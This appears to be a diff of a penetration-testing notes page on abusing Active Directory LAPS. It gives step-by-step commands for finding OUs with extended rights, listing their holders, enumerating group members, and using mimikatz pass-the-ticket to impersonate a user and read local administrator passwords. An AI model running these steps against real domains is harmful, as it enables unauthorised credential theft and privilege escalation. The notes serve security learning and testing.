@@ -16,6 +16,10 @@
 
 {% embed url="https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-management-powershell" %}
 
+4. **Additional resources**
+
+{% embed url="https://adsecurity.org/?p=3164" %}
+
 #### (2) Exploitation examples
 
 {% embed url="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/laps" %}
@@ -34,9 +38,7 @@ What is the `admpwd.dll` file?
 
 {% embed url="https://adsecurity.org/?p=3164" %}
 
-
-
-
+The presence of this file will indicate that the **Group Policy Client Side Extension** (**CSE**) is configured on the computer, and that the LAPS client is installed on the machine. It is located in `C:\program files\LAPS\CSE`.
 
 ### AllExtendedRights
 
@@ -46,34 +48,43 @@ For a given OU with this attribute set, any extended right holders (groups, user
 
 #### Exploitation steps
 
-1. Find an OU has the "All extended rights" attribute that deals with LAPS
+1. Query all the OUs that has the "**All extended rights**" attribute that deals with LAPS
 
-...
+{% embed url="https://learn.microsoft.com/en-us/powershell/module/laps/find-lapsadextendedrights?view=windowsserver2025-ps" %}
 
-2. Retrieve the extended right holders for that particular OU
+{% code overflow="wrap" %}
+```powershell
+PS> Find-LapsADExtendedRights -Identity *
+Name                 DistinguishedName                    Status
+----                  -----------------                   ------
+Domain Controllers  OU=Domain Controllers,DC=xxxx         Delegated
+<OU>                OU=<OU>,DC=xxxx                       Delegated
+```
+{% endcode %}
+
+2. Retrieve the extended right holders for a particular OU
 
 ```powershell
-PS> Find-AdmPwdExtendedRights -Identity <OU>
+PS> Find-LapsADExtendedRights -Identity <OU>
+ObjectDN         ExtendedRightHolders
+--------         -------------------
+OU=<OU>,DC=xxxx  {xxxx\xxxx}
 ```
-
-...
 
 3. Retrieve the users in the group
 
-Given that a particular group has the extended rights, ...
+Given that a particular group has extended rights, we can enumerate the users of that particular group:
 
 ```powershell
-PS> net groups <GROUP>
-PS> Get-ADGroupMembers ...
+PS> net groups <GROUPNAME>
+PS> Get-ADGroupMembers -Identity <GROUPNAME>
 ```
-
-...
 
 4. Retrieve the LAPS password
 
-Given that we have compromised or impersonate a particular user of the group (found in the previous step), we can retrieve the LAPS password of a particular machine under the OU. This will provide us with the local administrator password for that machine.
+Given that we have compromised or impersonate a particular user of that group (found in the previous step), we can retrieve the LAPS password of a particular machine under the OU. This will provide us with the local administrator password for that machine.
 
-First, we have to load the credentials for the user to impersonate using either a TGT (ptt) or simply using a username and password combination with the `runas.exe` utility:  &#x20;
+First, we have to load the credentials for the user to impersonate using either a TGT (pass-the-ticket) or simply a username and password combination with the `runas.exe` utility:  &#x20;
 
 ```powershell
 mimikatz # kerberos::ptt ...
